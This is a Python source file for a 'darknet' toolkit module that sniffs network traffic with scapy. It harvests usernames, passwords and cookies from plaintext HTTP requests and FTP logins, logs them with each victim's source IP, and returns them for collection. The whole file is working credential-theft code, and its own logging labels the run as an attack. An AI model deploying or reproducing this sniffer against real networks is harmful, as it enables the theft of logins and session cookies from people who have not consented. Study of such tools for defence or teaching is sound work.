"""
Packet sniffer module (Bettercap-style)
Capture and analyze network traffic
"""

from scapy.all import *
from darknet.core.base import BaseModule
from darknet.utils.constants import *
from darknet.utils.logger import setup_logger
from collections import defaultdict
import re


class PacketSniffer(BaseModule):
    """
    Advanced packet sniffer
    Captures and extracts sensitive information from network traffic
    """

    def __init__(self):
        super().__init__(
            name="Packet Sniffer",
            description="Capture and analyze network traffic"
        )
        self.packet_count = 0
        self.credentials_found = []
        self.cookies_found = []
        self.urls_visited = []
        self.protocols = defaultdict(int)
        self.capture_passwords = True
        self.capture_cookies = True
        self.capture_urls = True
        self.show_live = True

    def setup(self, **kwargs) -> bool:
        """
        Setup packet sniffer
        Args:
            interface: Network interface
            capture_passwords: Extract passwords
            capture_cookies: Extract cookies
            capture_urls: Extract URLs
            show_live: Show packets in real-time
            packet_filter: BPF filter
        """
        try:
            self.interface = kwargs.get('interface')
            self.capture_passwords = kwargs.get('capture_passwords', True)
            self.capture_cookies = kwargs.get('capture_cookies', True)
            self.capture_urls = kwargs.get('capture_urls', True)
            self.show_live = kwargs.get('show_live', True)
            self.packet_filter = kwargs.get('packet_filter', None)

            if not self.interface:
                self.logger.error("Interface required")
                return False

            self.logger.info(f"Packet sniffer configured:")
            self.logger.info(f"  Interface: {self.interface}")
            self.logger.info(f"  Capture passwords: {self.capture_passwords}")
            self.logger.info(f"  Capture cookies: {self.capture_cookies}")
            self.logger.info(f"  Capture URLs: {self.capture_urls}")

            return True

        except Exception as e:
            self.logger.error(f"Setup failed: {e}")
            return False

    def _extract_http_info(self, packet):
        """Extract information from HTTP packets"""
        try:
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore')

                # Extract URLs
                if self.capture_urls and 'Host:' in payload:
                    host_match = re.search(r'Host: ([^\r\n]+)', payload)
                    path_match = re.search(r'GET ([^\s]+)', payload) or re.search(r'POST ([^\s]+)', payload)

                    if host_match:
                        host = host_match.group(1)
                        path = path_match.group(1) if path_match else '/'
                        url = f"http://{host}{path}"

                        if url not in self.urls_visited:
                            self.urls_visited.append(url)
                            self.logger.capture(f"URL: {url}")

                # Extract credentials
                if self.capture_passwords:
                    # Look for common authentication patterns
                    password_patterns = [
                        r'password=([^&\s]+)',
                        r'passwd=([^&\s]+)',
                        r'pwd=([^&\s]+)',
                        r'pass=([^&\s]+)',
                        r'"password":"([^"]+)"',
                        r'"passwd":"([^"]+)"'
                    ]

                    username_patterns = [
                        r'username=([^&\s]+)',
                        r'user=([^&\s]+)',
                        r'login=([^&\s]+)',
                        r'email=([^&\s]+)',
                        r'"username":"([^"]+)"',
                        r'"email":"([^"]+)"'
                    ]

                    username = None
                    password = None

                    for pattern in username_patterns:
                        match = re.search(pattern, payload, re.IGNORECASE)
                        if match:
                            username = match.group(1)
                            break

                    for pattern in password_patterns:
                        match = re.search(pattern, payload, re.IGNORECASE)
                        if match:
                            password = match.group(1)
                            break

                    if username or password:
                        cred = {
                            'username': username or 'N/A',
                            'password': password or 'N/A',
                            'source_ip': packet[IP].src if packet.haslayer(IP) else 'N/A'
                        }
                        self.credentials_found.append(cred)
                        self.logger.capture(f"Credentials: {cred['username']} / {cred['password']} from {cred['source_ip']}")

                # Extract cookies
                if self.capture_cookies and 'Cookie:' in payload:
                    cookie_match = re.search(r'Cookie: ([^\r\n]+)', payload)
                    if cookie_match:
                        cookie = cookie_match.group(1)
                        self.cookies_found.append({
                            'cookie': cookie,
                            'source_ip': packet[IP].src if packet.haslayer(IP) else 'N/A'
                        })
                        if self.show_live:
                            self.logger.capture(f"Cookie: {cookie[:100]}...")

        except Exception as e:
            self.logger.debug(f"Error extracting HTTP info: {e}")

    def _extract_ftp_credentials(self, packet):
        """Extract FTP credentials"""
        try:
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore')

                if payload.startswith('USER ') or payload.startswith('PASS '):
                    parts = payload.split(' ', 1)
                    if len(parts) == 2:
                        cred_type = parts[0]
                        cred_value = parts[1].strip()

                        self.logger.capture(f"FTP {cred_type}: {cred_value}")

                        # Store credential
                        self.credentials_found.append({
                            'protocol': 'FTP',
                            'type': cred_type,
                            'value': cred_value,
                            'source_ip': packet[IP].src if packet.haslayer(IP) else 'N/A'
                        })

        except Exception:
            pass

    def _packet_callback(self, packet):
        """Main packet callback"""
        try:
            self.packet_count += 1

            # Track protocols
            if packet.haslayer(IP):
                if packet.haslayer(TCP):
                    self.protocols['TCP'] += 1

                    # Check ports for protocols
                    if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                        self.protocols['HTTP'] += 1
                        self._extract_http_info(packet)
                    elif packet[TCP].dport == 443 or packet[TCP].sport == 443:
                        self.protocols['HTTPS'] += 1
                    elif packet[TCP].dport == 21 or packet[TCP].sport == 21:
                        self.protocols['FTP'] += 1
                        self._extract_ftp_credentials(packet)
                    elif packet[TCP].dport == 22 or packet[TCP].sport == 22:
                        self.protocols['SSH'] += 1
                    elif packet[TCP].dport == 23 or packet[TCP].sport == 23:
                        self.protocols['TELNET'] += 1

                elif packet.haslayer(UDP):
                    self.protocols['UDP'] += 1

                    if packet[UDP].dport == 53 or packet[UDP].sport == 53:
                        self.protocols['DNS'] += 1
                    elif packet[UDP].dport == 67 or packet[UDP].sport == 67:
                        self.protocols['DHCP'] += 1

                elif packet.haslayer(ICMP):
                    self.protocols['ICMP'] += 1

            # Show live packet info
            if self.show_live and self.packet_count % 100 == 0:
                self.logger.info(f"Captured {self.packet_count} packets")

        except Exception as e:
            self.logger.debug(f"Error in packet callback: {e}")

    def run(self) -> dict:
        """Execute packet sniffing"""
        try:
            self.logger.attack("Starting packet sniffer")
            self.logger.warning("All network traffic will be captured and analyzed")

            # Start sniffing
            sniff(
                iface=self.interface,
                prn=self._packet_callback,
                filter=self.packet_filter,
                store=False,
                stop_filter=lambda x: self._stop_event.is_set()
            )

            self.logger.info("Packet sniffer stopped")

            # Print summary
            self.logger.info("\n=== Capture Summary ===")
            self.logger.info(f"Total packets: {self.packet_count}")
            self.logger.info(f"Credentials found: {len(self.credentials_found)}")
            self.logger.info(f"Cookies captured: {len(self.cookies_found)}")
            self.logger.info(f"URLs visited: {len(self.urls_visited)}")

            self.logger.info("\nProtocol distribution:")
            for protocol, count in sorted(self.protocols.items(), key=lambda x: x[1], reverse=True):
                self.logger.info(f"  {protocol}: {count}")

            return {
                'success': True,
                'packets_captured': self.packet_count,
                'credentials': self.credentials_found,
                'cookies': self.cookies_found,
                'urls': self.urls_visited,
                'protocols': dict(self.protocols)
            }

        except Exception as e:
            self.logger.error(f"Sniffer failed: {e}")
            return {'success': False, 'error': str(e)}

    def stop(self):
        """Stop sniffing"""
        self._stop_event.set()
        self.logger.info("Stopping packet sniffer")

    def cleanup(self):
        """Cleanup resources"""
        pass

    def get_credentials(self):
        """Get captured credentials"""
        return self.credentials_found

    def get_cookies(self):
        """Get captured cookies"""
        return self.cookies_found

    def get_urls(self):
        """Get visited URLs"""
        return self.urls_visited
